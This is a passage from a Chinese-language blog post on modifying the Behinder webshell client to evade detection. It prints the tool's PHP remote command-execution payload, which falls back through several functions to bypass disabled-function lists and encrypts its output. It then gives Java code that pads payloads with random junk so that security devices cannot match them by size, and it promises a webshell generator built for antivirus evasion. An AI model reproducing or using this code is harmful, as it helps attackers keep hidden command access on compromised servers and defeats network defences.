class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @set_time_limit(<span class="number">0</span>);</span><br><span class="line">    @ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    @ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$PadtJn</span> = @ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== strpos(strtolower(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! feof(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = shell_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        exec(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = join(chr(<span class="number">10</span>), <span class="variable">$kWJW</span>) . chr(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= fread(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> encrypt(json_encode(<span class="variable">$result</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(getSafeStr(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> encrypt(json_encode(<span class="variable">$result</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> @session_start();</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">    			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">return</span> openssl_encrypt(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;Y2QgL3d3dy93d3dyb290L3BocC9yZWJleW9uZC8gO2xz&quot;</span>;<span class="variable">$cmd</span>=base64_decode(<span class="variable">$cmd</span>);<span class="variable">$path</span>=<span class="string">&quot;L3d3dy93d3dyb290L3BocC9yZWJleW9uZC8=&quot;</span>;<span class="variable">$path</span>=base64_decode(<span class="variable">$path</span>);</span><br><span class="line">main(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>

<p>就会得到一个源码里的模板，和执行命令传的参数，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004420175.png" alt="image-20250702004420175"></p>
<p>这里cmd解出来就是传递的参数了，因为模板是确定的，那么他的传递的值大小就是确定的，这里因为我们执行的命令不一样，可能不一样，为什么呢，因为我们常常执行的命令都很短，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702004840065.png" alt="image-20250702004840065"></p>
<p>这里可以看到，执行短的命令就是5740左右，执行长的就会相应的加上一些。</p>
<p>我们这里考虑到如果安全设备标记了这个长度，那就不好了，我们可以在模板中加一些字符串，让这个模板变大一些。首先在net/rebeyond/behinder/core/Params.java<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014110041-17513916703093.png" alt="image-20250702014110041"></p>
<p>找到相关的代码，因为每次都会加载php，我们刚刚看到的模板也copy出来一份，在net/rebeyond/behinder/core/Params.java中写一个随机位数的字符串，跨度大一些，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String CHAR_POOL = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">int</span> length = random.nextInt(<span class="number">51</span>) + <span class="number">150</span>;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder(length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            sb.append(CHAR_POOL.charAt(random.nextInt(CHAR_POOL.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        String randomStr = sb.toString();</span><br></pre></td></tr></table></figure>

<p>随机150-200字符，太大了也不行，影响传输，慢。</p>
<p>然后再模板中随意定义一个变量</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014615170.png" alt="image-20250702014615170"></p>
<p>然后在进行替换一下，就好了。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702014634806.png" alt="image-20250702014634806"></p>
<p>打包编译，看下效果。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702021249763.png" alt="image-20250702021249763"></p>
<p>可以看到，再执行命令的时候也就可以动态的调整大小了。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702021619775.png" alt="image-20250702021619775"></p>
<p>相应的，我们再解请求包的时候，也就可以看到这个字符串了。</p>
<p>这里笔者只是加了cmd.php其他的都没加，因为笔者再测试的时候发现，其他功能的请求字符串大小波动比较大，都没有太固定再一个值范围边，如果需要的话，从新copy一份，加上要替换的字符也就可以了。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705230906068.png" alt="image-20250705230906068"></p>
<p>顺便在加一下jsp的，</p>
<p>需要在net/rebeyond/behinder/core/Params.java的</p>
<p><code>public static byte[] getTransProtocoledClass(String className, TransProtocol transProtocol) throws Exception &#123;</code></p>
<p>修改，用到class修改，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getTransProtocoledClass(String className, TransProtocol transProtocol) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String transProtocolName = transProtocol.getName();</span><br><span class="line">        <span class="keyword">if</span> (transProtocol.getId() &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            String key = ((LegacyCryptor)transProtocol.getCryptor()).getKey();</span><br><span class="line">            <span class="keyword">if</span> (legacyPayloadClassCache.containsKey(transProtocolName) &amp;&amp; legacyPayloadClassCache.get(transProtocolName).containsKey(key) &amp;&amp; legacyPayloadClassCache.get(transProtocolName).get(key).containsKey(className)) &#123;</span><br><span class="line">                <span class="keyword">return</span> legacyPayloadClassCache.get(transProtocolName).get(key).get(className).toBytecode();</span><br><span class="line">            &#125;</span><br><span class="line">            ClassPool cp = ClassPool.getDefault();</span><br><span class="line">            CtClass PocCls = cp.getAndRename(String.format(<span class="string">&quot;net.rebeyond.behinder.payload.java.%s&quot;</span>, className), Utils.getRandomString(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//java</span></span><br><span class="line">            <span class="comment">// === 插入随机字段 ===</span></span><br><span class="line">            String chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span>;</span><br><span class="line">            Random random = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">int</span> length = <span class="number">150</span> + random.nextInt(<span class="number">1500</span>);</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                sb.append(chars.charAt(random.nextInt(chars.length())));</span><br><span class="line">            &#125;</span><br><span class="line">            String randomValue = sb.toString();</span><br><span class="line">            String fieldName = <span class="string">&quot;bohemian_&quot;</span> + random.nextInt(<span class="number">9999</span>);</span><br><span class="line">            String fieldSrc = <span class="string">&quot;private static final String &quot;</span> + fieldName + <span class="string">&quot; = \&quot;&quot;</span> + randomValue + <span class="string">&quot;\&quot;;&quot;</span>;</span><br><span class="line">            CtField junkField = CtField.make(fieldSrc, PocCls);</span><br><span class="line">            PocCls.addField(junkField);</span><br><span class="line">            <span class="comment">//end</span></span><br><span class="line"></span><br><span class="line">            CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);</span><br><span class="line">            PocCls.removeMethod(PocCls.getDeclaredMethod(<span class="string">&quot;Encrypt&quot;</span>));</span><br><span class="line">            PocCls.addMethod(encodeMethod);</span><br><span class="line">            PocCls.setName(className);</span><br><span class="line">            PocCls.detach();</span><br><span class="line">            Map&lt;String, CtClass&gt; payloadClass = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            payloadClass.put(className, PocCls);</span><br><span class="line">            Map&lt;String, Map&lt;String, CtClass&gt;&gt; keyPayloadMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            keyPayloadMap.put(key, payloadClass);</span><br><span class="line">            legacyPayloadClassCache.put(transProtocolName, keyPayloadMap);</span><br><span class="line">            <span class="keyword">return</span> PocCls.toBytecode();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (payloadClassCache.containsKey(transProtocolName) &amp;&amp; payloadClassCache.get(transProtocolName).containsKey(className)) &#123;</span><br><span class="line">            <span class="keyword">return</span> payloadClassCache.get(transProtocolName).get(className).toBytecode();</span><br><span class="line">        &#125;</span><br><span class="line">        ClassPool cp = ClassPool.getDefault();</span><br><span class="line">        CtClass PocCls = cp.getAndRename(String.format(<span class="string">&quot;net.rebeyond.behinder.payload.java.%s&quot;</span>, className), Utils.getRandomString(<span class="number">10</span>));</span><br><span class="line">        CtMethod encodeMethod = CtNewMethod.make(transProtocol.getEncode(), PocCls);</span><br><span class="line">        PocCls.removeMethod(PocCls.getDeclaredMethod(<span class="string">&quot;Encrypt&quot;</span>));</span><br><span class="line">        PocCls.addMethod(encodeMethod);</span><br><span class="line">        PocCls.setName(className);</span><br><span class="line">        PocCls.detach();</span><br><span class="line">        HashMap&lt;String, CtClass&gt; payloadClass = <span class="keyword">new</span> HashMap&lt;String, CtClass&gt;();</span><br><span class="line">        payloadClass.put(className, PocCls);</span><br><span class="line">        payloadClassCache.put(transProtocolName, payloadClass);</span><br><span class="line">        <span class="keyword">return</span> PocCls.toBytecode();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705231249340.png" alt="image-20250705231249340"></p>
<p>这样每次用的时候执行命令的时候，就会把数据包随机的扩大一些了。</p>
<p>Content-length大小的改变就先到这里吧。</p>
<p>网上还有其他大师傅的文章说，每次客户端请求的时候，客户端的端口号是从<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702025210498.png" alt="image-20250702025210498"></p>
<p>49700左右开始加的，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250702025359673-17513960398604.png" alt="image-20250702025359673"></p>
<p>笔者在测试的时候似乎没发现这个特征，这里不太清楚是因为木马是3.0的原因还是啥，这里就不过多研究了，等下个文章研究4.0木马的时候，我们再来研究是否有这个特征。</p>
<p>接下来，我们还是要看一下冰蝎的流量，从以前写的文章中我们知道，在godzilla中</p>
<p>请求流量php是可以左右加参数的，如 a=s&amp;b=d&amp;pass=balbal，godzilla的木马有两个参数，一个是pass，一个是key，pass是用来传参的，而key是用来异或的，所以pass的值才是server端php所接受的参数，而在Behinder中，php的木马是是用的<code>file_get_contents(&quot;php://input&quot;);</code>来接受所有的传递内容，所以我们在看behinder的流量时，会发现，是没有参数传递的。这个函数file_get_contents(“php://input”)和字符串，后面免杀要重点关注。<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705202555384.png" alt="image-20250705202555384"></p>
<p>这里如果在加一些 a=s&amp;b=d&amp;pass=balbal，似乎有些不好，不是那么规整了，这里就不在画蛇添足了。当然，如果想加的话，也不是不行，$post=file_get_contents(“php://input”);，直接获取参数的值给post变量即可。<br>下面我们来看，返回包，从以前写的文章中我们知道，godzilla的返回包带有密码和key的md5值，在返回包的前后，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203237843-17517187580431.png" alt="image-20250705203237843"></p>
<p>也就是这样的，<a href="https://bohemian.top/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/#php">godzilla二开</a>，在前面的文章中可以看到我们在二开哥斯拉的时候，给他修改了一下，让他没那么明显，<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203447624.png" alt="image-20250705203447624"></p>
<p>也就是这样，让他没那么明显，但是我们回过头来看behinder的返回包</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705203604434.png" alt="image-20250705203604434"></p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204058620.png" alt="image-20250705204058620"></p>
<p>看起来似乎就是加密的流量，如果不解密出来的话，没有什么明显的特征，如果这里加成那种带message的其实也行，但是感觉没什么必要，加了有点突兀，这里笔者就先不加了。当然如果你想加也是可以的，在net/rebeyond/behinder/core/ShellService.java中，对data数据进行操作就可以了，当然前提是你的木马也要修改，就是echo一下。</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204158159.png" alt="image-20250705204158159"></p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705204316386.png" alt="image-20250705204316386"></p>
<p>也就是说，整体上来看behinder3.0的流量看起来还是挺正常的。目前来看不太需要进行更改。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里也只是简单的对冰蝎3.0的数据包流量进行一丢丢的修改，看到网上的一些特征做隐去处理，没有做过多的更改</p>
<h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>下个版本我们将做免杀，我们都知道，哥斯拉是可以直接生成木马的，而冰蝎不能直接生成，是自带的在，在我们下载的时候，<img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705231938998.png" alt="image-20250705231938998"></p>
<p>在server中，这样的话，不是很方便。</p>
<p>下个版本将新增一个免杀生成按钮，</p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705232010941.png" alt="image-20250705232010941"></p>
<p><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250705232203175.png" alt="image-20250705232203175"></p>
<p>点开后，输入密码生成即可。</p>
<p>目前框架已写好了，php和asp已经做完免杀了，其他的还需要做一些。很快将会完成。</p>
<h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a target="_blank" rel="noopener" href="https://github.com/Bohemiana/behinder_erkai">https://github.com/Bohemiana/behinder_erkai</a><br>src代码也以上传，免杀已有框架代码，大家直接下载研究即可。</p>
<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。如果您感觉文章写的不错或者工具用起来还行，帮笔者点点stars、给公众号点点关注，先谢谢大家了。</p>
<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder            原版behinder</span><br></pre></td></tr></table></figure>

<blockquote>
<p>emmm 太菜了<br>一直在路上</p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/">https://bohemian.top/2025/06/19/冰蝎二开v1-0/冰蝎二开从0到1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BA%8C%E5%BC%80/">二开</a><a class="post-meta__tags" href="/tags/behinder/">behinder</a></div><div class="post-share"><div class="social-share" data-image="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img class="cover" src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">哥斯拉二开从0到1-6(jspx免杀)</div></div><div class="info-2"><div class="info-item-1">前言上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下jspx流量修改及免杀。 jspx简介JSPX (JavaServer Pages XML) 是一种基于 XML 语法的 JSP（JavaServer Pages）格式。它将 JSP 与 XML 的严格语法规则结合，确保页面中的所有标签都符合 XML 的结构要求。通过使用 JSPX，开发人员可以得到一个符合 XML 规范的页面，这在某些情况下非常重要，例如处理 XML 数据或需要与其他 XML 系统进行集成时。JSPX 就是 JSP 的 XML 版本，主要区别在于 XML 的严格语法要求。 看起来是aspx和asmx的关系差不多。就是XML版本的。 jspx免杀我们先来看一下Godzilla的jspx生成原版木马 12&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:declaration&gt; String...</div></div></div></a><a class="pagination-related" href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="冰蝎二开从0到1-2(免杀)"><img class="cover" 